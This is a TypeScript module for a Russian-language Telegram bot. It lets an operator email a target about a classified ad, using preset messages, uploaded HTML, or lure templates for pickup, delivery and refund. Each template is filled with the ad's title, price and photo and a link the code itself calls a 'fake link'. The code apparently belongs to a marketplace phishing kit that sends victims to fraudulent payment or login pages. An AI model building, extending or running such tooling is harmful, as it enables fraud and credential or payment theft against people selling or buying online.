import { Composer } from "grammy";
import {
  type Conversation,
  createConversation,
  ConversationMenuRange,
} from "@grammyjs/conversations";
import type { CustomContext } from "../types";
import { PresetRepo, AdvertsRepo } from "../db/queries";
import { preSendEmail } from "../utils/sendEmail";

import { readFile } from "fs/promises";
import { join, resolve, dirname } from "path";
import { fileURLToPath } from "url";

const HERE =
  typeof __dirname !== "undefined"
    ? __dirname
    : dirname(fileURLToPath(import.meta.url));

const TPL_DIR = resolve(HERE, "../templates");

async function renderTemplate(
  name: "back" | "go" | "push" | "sms",
  link: string
): Promise<string> {
  const file = join(TPL_DIR, `${name}.html`);
  const html = await readFile(file, "utf8");
  return html.replace(/ADVERT_LINK|advert_link/g, link);
}

type AdvertTemplateData = {
  title: string;
  price: string;
  photo: string;
  link: string;
};

async function renderAdvertTemplate(
  name: "ZABOR" | "ДОСТАВКА" | "ВЕРНУТЬ",
  data: AdvertTemplateData
): Promise<string> {
  const file = join(TPL_DIR, `${name}.txt`);
  const html = await readFile(file, "utf8");
  return html
    .replaceAll("[[ITEM_TITLE]]", data.title)
    .replaceAll("[[ITEM_PRICE]]", data.price)
    .replaceAll("[[ITEM_PHOTO]]", data.photo)
    .replaceAll("[[GEN_LINK]]", data.link);
}

const composer = new Composer<CustomContext>();

async function sendEmailConv(
  conversation: Conversation<CustomContext, CustomContext>,
  ctx: CustomContext,
  mailId: number
) {
  const sendEmailMenu = conversation
    .menu("send-email", { autoAnswer: false })
    .text("📬 Отправить пресет", async (ctx) => {
      const presetsEditMenu = conversation
        .menu("presets-edit-menu")
        .dynamic(async (ctx) => {
          const range = new ConversationMenuRange<CustomContext>();

          const presets = await conversation.external((ctx) =>
            PresetRepo.list(ctx.from!.id)
          );

          for (const preset of presets) {
            range
              .text(preset.title, async (ctx) => {
                await ctx.deleteMessage();

                conversation.external((ctx) =>
                  preSendEmail(ctx, mailId, preset.text)
                );

                await conversation.halt();
              })
              .row();
          }

          range.text("♻️ Скрыть", async (ctx) => {
            await ctx.menu.close();
            await ctx.deleteMessage();
            await conversation.halt();
          });

          return range;
        });

      await ctx.editMessageText(`Нажмите на пресет для отправки`, {
        parse_mode: "HTML",
        reply_markup: presetsEditMenu,
      });

    })
    .text("📝 Отправить html", async (ctx) => {
      const htmlTemplatesMenu = conversation
        .menu("html-templates")
        .dynamic(async () => {
          const range = new ConversationMenuRange<CustomContext>();
          const link = await AdvertsRepo.getFakeLink(mailId);

          const advert = await AdvertsRepo.getAdvertDataByMailId(mailId);

          const queueAdvertTemplate = async (
            name: "ZABOR" | "ДОСТАВКА" | "ВЕРНУТЬ"
          ) => {
            const html = await renderAdvertTemplate(name, {
              title: advert?.title ?? "",
              price: advert?.price ?? "",
              photo: advert?.photo ?? "",
              link: link!,
            });
            conversation.external((ctx) =>
              preSendEmail(ctx, mailId, undefined, html)
            );
          };

          const templateButtons = new ConversationMenuRange<CustomContext>()
            .text("📄 GO", async (ctx) => {
              const html = await renderTemplate("go", link!);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row()
            .text("📨 PUSH", async (ctx) => {
              const html = await renderTemplate("push", link!);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .text("💬 SMS", async (ctx) => {
              const html = await renderTemplate("sms", link!);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row()
            .text("🆘 BACK", async (ctx) => {
              const html = await renderTemplate("back", link!);
              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row()
            .text("📦 ZABOR", async (ctx) => {
              await queueAdvertTemplate("ZABOR");
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .text("🚚 ДОСТАВКА", async (ctx) => {
              await queueAdvertTemplate("ДОСТАВКА");
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row()
            .text("↩️ ВЕРНУТЬ", async (ctx) => {
              await queueAdvertTemplate("ВЕРНУТЬ");
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })
            .row();

          if (link) {
            range.addRange(templateButtons);
          }

          range
            .text("📑 CUSTOM", async (ctx) => {
              const cancelMenu = conversation
                .menu("cancel", { autoAnswer: false })
                .text("🚫 Отмена", async (ctx) => {
                  await ctx.menu.close();
                  await ctx.answerCallbackQuery("⚡️ Действие отменено");
                  await ctx.deleteMessage().catch(() => {});
                  await conversation.halt();
                });

              await ctx.editMessageText(
                `✍️ Вставьте HTML <b>текстом</b> или <b>файлом .txt/.html</b>`,
                {
                  parse_mode: "HTML",
                  reply_markup: cancelMenu,
                }
              );

              const input = await conversation.waitFor(
                ["message:text", "message:document"],
                {
                  otherwise: async (ctx) => {
                    if (ctx.callbackQuery) return;
                    await ctx.deleteMessage().catch(() => {});
                  },
                }
              );

              let html: string;
              if (input.message.text) {
                html = input.message.text.trim();
              } else if (input.message.document) {
                const path = await conversation.external(async (ctx) => {
                  const file = await ctx.getFile();
                  return await file.download();
                });
                html = await Bun.file(path).text();
              } else {
                await ctx.reply("❌ Неверный формат. Вставьте текст или файл.");
                return;
              }

              conversation.external((ctx) =>
                preSendEmail(ctx, mailId, undefined, html)
              );

              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            })

            .row()
            .text("♻️ Скрыть", async (ctx) => {
              await ctx.menu.close();
              await ctx.deleteMessage();
              await conversation.halt();
            });

          return range;
        });

      await ctx.editMessageText(`Нажмите на html для отправки`, {
        parse_mode: "HTML",
        reply_markup: htmlTemplatesMenu,
      });

    })
    .row()
    .text("🚫 Отмена", async (ctx) => {
      await ctx.menu.close();
      await ctx.answerCallbackQuery("⚡️ Действие отменено");
      await ctx.deleteMessage();
      await conversation.halt();
    });

  const reply = await ctx.reply(`✍️ Введите сообщение`, {
    parse_mode: "HTML",
    reply_markup: sendEmailMenu,
  });

  const message = await conversation.waitFor("message:text", {
    otherwise: async (ctx) => {
      if (!ctx.message?.text) return;
      return ctx.deleteMessage().catch(() => {});
    },
  });

  await message.deleteMessage();
  await reply.delete();

  conversation.external((ctx) =>
    preSendEmail(ctx, mailId, message.message.text)
  );
  await conversation.halt();
}

composer.use(createConversation(sendEmailConv));
export default composer;
